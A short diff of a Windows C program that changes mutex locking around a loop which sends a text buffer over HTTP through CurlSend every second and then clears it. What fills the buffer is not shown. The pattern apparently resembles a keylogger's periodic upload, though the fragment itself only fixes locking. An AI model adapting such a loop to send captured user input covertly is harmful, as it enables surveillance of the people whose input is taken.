@@ -295,21 +295,14 @@ int main(int argn, char* argv[])
 
 			len = strlen(buffer);
 
-			// unlock
-			ReleaseMutex(mutex);
-
 			int res = CurlSend(buffer, len, "text=");
 			if(res)
 			{
-				// lock
-				WaitForSingleObject(mutex, INFINITE);
-
 				// reset buffer
 				strcpy(buffer, buffer + len);
-
-				// unlock
-				ReleaseMutex(mutex);
 			}
+			// unlock
+			ReleaseMutex(mutex);
 		}
 		timer++;
 		Sleep(1000); // 1 sec sleep
